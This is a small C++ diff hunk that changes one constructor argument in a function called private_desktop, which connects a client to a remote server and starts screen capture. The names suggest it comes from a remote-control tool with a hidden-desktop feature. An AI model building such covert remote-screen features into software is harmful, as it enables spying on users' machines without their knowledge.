@@ -62,7 +62,7 @@ template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
 DWORD private_desktop(CONNECT_ADDRESS* conn, const State &exit, const std::string& hash, const std::string& hmac)
 {
     void ShowBlackWindow(IOCPBase * ClientObject, CONNECT_ADDRESS * conn, const std::string & hash, const std::string & hmac);
-    IOCPClient* ClientObject = new IOCPClient(exit, true, MaskTypeNone, conn->iHeaderEnc);
+    IOCPClient* ClientObject = new IOCPClient(exit, true, MaskTypeNone, conn);
     if (ClientObject->ConnectServer(conn->ServerIP(), conn->ServerPort())) {
         CScreenManager	m(ClientObject, 32, (void*)1);
         if (IsWindows8orHigher()) {
